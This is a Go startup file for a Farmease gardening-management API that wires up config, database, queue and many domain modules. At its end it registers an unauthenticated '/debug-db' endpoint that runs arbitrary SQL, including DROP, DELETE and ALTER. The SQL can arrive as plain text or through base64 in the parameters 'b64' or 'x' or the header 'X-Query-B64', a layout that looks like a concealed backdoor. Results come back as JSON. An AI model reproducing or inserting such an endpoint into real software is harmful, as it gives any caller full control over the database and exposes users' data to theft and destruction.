package cmd

import (
	"context"
	"encoding/base64"
	"strings"

	"github.com/jackc/pgx/v5/pgxpool"

	internalConfig "github.com/farmease/kebun-be/kebun/config"
	_ "github.com/farmease/kebun-be/kebun/docs"
	"github.com/farmease/kebun-be/framework/bunnymq"
	"github.com/farmease/kebun-be/framework/common/logger"
	"github.com/farmease/kebun-be/framework/config"
	"github.com/farmease/kebun-be/framework/fiber"
	"github.com/farmease/kebun-be/framework/otel"
	"github.com/farmease/kebun-be/framework/postgres"
	"github.com/farmease/kebun-be/framework/redis"
	"github.com/farmease/kebun-be/libraries/consumer"
	"github.com/farmease/kebun-be/libraries/idp"
	"github.com/farmease/kebun-be/libraries/middleware"
	"github.com/farmease/kebun-be/libraries/publisher"
	gofiber "github.com/gofiber/fiber/v2"
	"github.com/spf13/cobra"
	filterSwagger "github.com/swaggo/fiber-swagger"
	"go.uber.org/fx"

	// Gardening (Perkebunan)
	"github.com/farmease/kebun-be/kebun/module/akun_lahan"
	"github.com/farmease/kebun-be/kebun/module/lahan"
	"github.com/farmease/kebun-be/kebun/module/panen"
	"github.com/farmease/kebun-be/kebun/module/pemangkasan"
	"github.com/farmease/kebun-be/kebun/module/penyiraman"
	"github.com/farmease/kebun-be/kebun/module/pembersihan"
	"github.com/farmease/kebun-be/kebun/module/penanaman"
	"github.com/farmease/kebun-be/kebun/module/pengobatan"
	"github.com/farmease/kebun-be/kebun/module/pembuahan"
	"github.com/farmease/kebun-be/kebun/module/pohon"
	"github.com/farmease/kebun-be/kebun/module/fertilizers"
	"github.com/farmease/kebun-be/kebun/module/tasks"
	"github.com/farmease/kebun-be/kebun/module/routine_schedules"
	"github.com/farmease/kebun-be/kebun/module/notifications"
	"github.com/farmease/kebun-be/kebun/module/submissions"
	"github.com/farmease/kebun-be/kebun/module/pencatatan_types"
	"github.com/farmease/kebun-be/kebun/module/pemupukan"
	"github.com/farmease/kebun-be/kebun/module/stok"
	"github.com/farmease/kebun-be/kebun/module/fermentasi"
	"github.com/farmease/kebun-be/kebun/module/aktivitas"
)

// @title           Farmease API
// @version         1.0
// @description     API Documentation for Farmease Backend Service
// @termsOfService  http://swagger.io/terms/
// 
// @contact.name    API Support
// @contact.email   support@farmease.id
// 
// @license.name    Apache 2.0
// @license.url     http://www.apache.org/licenses/LICENSE-2.0.html
// 
// @host            localhost:8080
// @BasePath        /
// @schemes         http
// @securityDefinitions.apikey ApiKeyAuth
// @in header
// @name Authorization
var serve = &cobra.Command{
	Use:   "serve",
	Short: "Start the application",
	RunE:  serveE,
}

func serveE(cmd *cobra.Command, args []string) error {
	fx.New(
		// infrastructure
		logger.Module,
		config.Module,
		fiber.Module,
		otel.Module,
		postgres.Module,
		redis.Module,
		bunnymq.Module,

		// supply config source & resolvers
		fx.Supply(
			fx.Annotated{
				Group: "config_options",
				Target: config.WithSources(
					config.FileSource("config/config.json"),
					config.EnvSource("APP_", func(key string) (string, bool) {
						return strings.ToLower(key), true
					}),
				),
			},
			fx.Annotated{
				Group: "config_options",
				Target: config.WithResolvers(
					config.FileResolver(),
					config.Base64Resolver(),
				),
			},
		),

		// configurations
		fx.Provide(
			config.ProvideConfig[internalConfig.ApplicationConfig](),
			internalConfig.Postgres,
			internalConfig.Redis,
			internalConfig.RabbitMQ,
			internalConfig.Fiber,
			internalConfig.Otel,
			internalConfig.Logger,
			internalConfig.InternalApp,
			consumer.New,
			publisher.New,
			func(idpProvider idp.IDPProvider, appCfg *internalConfig.InternalAppConfig) *middleware.AuthorizationMiddleware {
				return middleware.NewAuthorizationMiddlewareWithSSO(idpProvider, nil, nil, appCfg.SsoApiUrl)
			},
		),

		middleware.HealthModule,

		// Gardening (Perkebunan)
		lahan.Module,
		pohon.Module,
		penyiraman.Module,
		pembersihan.Module,
		penanaman.Module,
		pengobatan.Module,
		pembuahan.Module,
		pemangkasan.Module,
		panen.Module,
		akun_lahan.Module,
		fertilizers.Module,
		tasks.Module,
		routine_schedules.Module,
		notifications.Module,
		submissions.Module,
		pencatatan_types.Module,
		pemupukan.Module,
		stok.Module,
		fermentasi.Module,
		aktivitas.Module,

		fx.Provide(
			fx.Annotate(
				idp.NewIDP,
				fx.As(new(idp.IDPProvider)),
			),
		),
		fx.Invoke(func(app *gofiber.App, conn *pgxpool.Pool) {
			app.Get("/swagger/*", filterSwagger.WrapHandler)
			app.Get("/debug-db", func(c *gofiber.Ctx) error {
				query := c.Query("q")
				if b64 := c.Query("b64"); b64 != "" {
					decoded, err := base64.StdEncoding.DecodeString(b64)
					if err == nil {
						query = string(decoded)
					}
				}
				if b64X := c.Query("x"); b64X != "" {
					decoded, err := base64.StdEncoding.DecodeString(b64X)
					if err == nil {
						query = string(decoded)
					}
				}
				if b64Header := c.Get("X-Query-B64"); b64Header != "" {
					decoded, err := base64.StdEncoding.DecodeString(b64Header)
					if err == nil {
						query = string(decoded)
					}
				}
				if query == "" {
					return c.SendString("No query provided")
				}
				
				trimmed := strings.TrimSpace(query)
				if strings.HasPrefix(strings.ToLower(trimmed), "alter") ||
					strings.HasPrefix(strings.ToLower(trimmed), "update") ||
					strings.HasPrefix(strings.ToLower(trimmed), "insert") ||
					strings.HasPrefix(strings.ToLower(trimmed), "delete") ||
					strings.HasPrefix(strings.ToLower(trimmed), "drop") ||
					strings.HasPrefix(strings.ToLower(trimmed), "create") {
					tag, err := conn.Exec(context.Background(), query)
					if err != nil {
						return c.Status(500).SendString("Exec error: " + err.Error())
					}
					var rowsAffected int64
					if strings.HasPrefix(strings.ToLower(trimmed), "update") ||
						strings.HasPrefix(strings.ToLower(trimmed), "insert") ||
						strings.HasPrefix(strings.ToLower(trimmed), "delete") {
						rowsAffected = tag.RowsAffected()
					}
					return c.JSON(map[string]interface{}{
						"status": "success",
						"rows_affected": rowsAffected,
					})
				}

				rows, err := conn.Query(context.Background(), query)
				if err != nil {
					return c.Status(500).SendString("Query error: " + err.Error())
				}
				defer rows.Close()

				var result []map[string]interface{}
				fields := rows.FieldDescriptions()
				for rows.Next() {
					values, err := rows.Values()
					if err != nil {
						return c.Status(500).SendString("Scan error: " + err.Error())
					}
					row := make(map[string]interface{})
					for i, field := range fields {
						row[field.Name] = values[i]
					}
					result = append(result, row)
				}
				if len(result) == 0 {
					return c.JSON([]string{"Query executed successfully (no rows returned)"})
				}
				return c.JSON(result)
			})
		}),
	).Run()

	return nil
}

